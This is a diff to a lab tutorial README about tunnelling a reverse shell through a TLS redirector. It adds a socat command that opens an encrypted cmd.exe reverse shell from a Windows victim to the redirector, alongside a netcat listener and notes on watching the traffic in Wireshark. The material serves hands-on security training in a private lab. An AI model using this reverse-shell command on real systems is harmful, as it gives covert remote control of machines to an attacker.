@@ -15,7 +15,7 @@ Eventually we can concetrate our effort in hardening the CentOS server (attacker
 #### Victim machine. 
 - IP 192.168.1.6
 
-Download the compiled socat for windows from here: https://github.com/zinzloun/TLS_redirect/raw/main/socat-1.7.3.2-1-x86_64.zip. Unzip the file e move the unzipped folder where you prefer, of course the folder is the position from where we will execute our payload. For convenience I put the folder into the enviroment PATH variable
+Download the compiled socat for windows from here: https://github.com/zinzloun/TLS_redirect/raw/main/socat-1.7.3.2-1-x86_64.zip. Unzip the file and move the unzipped folder where you prefer, of course the folder is the position from where we will execute our payload. For convenience I put the folder into the enviroment PATH variable
 
 #### TLS redirector
 - Dual homed
@@ -80,5 +80,17 @@ Finally lunch the listener:
 sudo nc -lvp 6666
 ```
 
+## Verify
+On the Win victim machine lunch the socat TLS reverse shell as follows:
+```
+socat OPENSSL:192.168.1.7:443,verify=0 EXEC:'cmd.exe',pipes
+```
+We can follow the stream usign Wireshark
 
   
+---
+**NOTE**
+
+If your Lab (as mine) is created using a virtualizer (e.g. Virtualbox) remember that you can not itercept any traffics with a bridged mode network configuration on the host machine, since it bypass the host OS network stack entirely. Here I'm running Wireshark on the guest Parrot OS redirector
+
+---
